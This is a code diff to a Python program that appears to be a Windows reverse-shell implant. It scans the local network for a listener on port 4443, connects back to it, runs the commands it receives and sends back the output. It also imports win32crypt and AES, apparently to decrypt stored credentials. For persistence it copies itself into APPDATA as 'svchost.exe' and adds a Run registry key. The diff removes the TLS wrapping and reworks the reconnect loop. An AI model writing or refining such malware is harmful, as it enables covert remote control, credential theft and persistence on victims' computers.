@@ -1,5 +1,4 @@
 import socket
-import ssl
 import subprocess
 import time
 import os
@@ -9,12 +8,10 @@ import sqlite3
 import base64
 import json
 import win32crypt
-import sys
 from Crypto.Cipher import AES
 
 PORT = 4443
 CHECK_INTERVAL = 10
-SERVER_HOSTNAME = 'localhost'  # Palitan kung iba ang hostname
 
 def get_network_segment():
     try:
@@ -38,16 +35,10 @@ def find_listener():
         if target_ip == get_active_ip():
             continue
         try:
-            # SSL connection test
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_HOSTNAME)
-            ssl_sock.settimeout(1.0)
-            result = ssl_sock.connect_ex((target_ip, PORT))
-            ssl_sock.close()
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target_ip, PORT))
+            sock.close()
             if result == 0:
                 return target_ip
         except:
@@ -67,26 +58,17 @@ def get_active_ip():
 def setup_persistence():
     dest = os.path.join(os.getenv("APPDATA"), "svchost.exe")
     if not os.path.exists(dest):
-        try:
-            shutil.copy2(sys.executable, dest)
-            subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f', 
-                         shell=True, capture_output=True)
-        except Exception:
-            pass
+        shutil.copy2(__file__, dest)
+        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f')
 
 def connect():
-    context = ssl.create_default_context()
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
-
     while True:
         try:
             listener_ip = find_listener()
             if listener_ip:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                ssl_sock = context.wrap_socket(sock, server_hostname=SERVER_HOSTNAME)
-                ssl_sock.connect((listener_ip, PORT))
-                return ssl_sock
+                sock.connect((listener_ip, PORT))
+                return sock
         except:
             pass
         time.sleep(CHECK_INTERVAL)
@@ -202,12 +184,18 @@ def handle_server(s):
                 output = "[*] No output returned.\n"
             s.sendall(output.encode() + b"__end__")
 
-    except Exception:
+    except Exception as e:
         pass
 
-if __name__ == "__main__":
+def main():
     setup_persistence()
     while True:
-        sock = connect()
-        handle_server(sock)
-        time.sleep(CHECK_INTERVAL)
+        try:
+            sock = connect()
+            handle_server(sock)
+            time.sleep(CHECK_INTERVAL)
+        except Exception as e:
+            time.sleep(CHECK_INTERVAL)
+
+if __name__ == "__main__":
+    main()
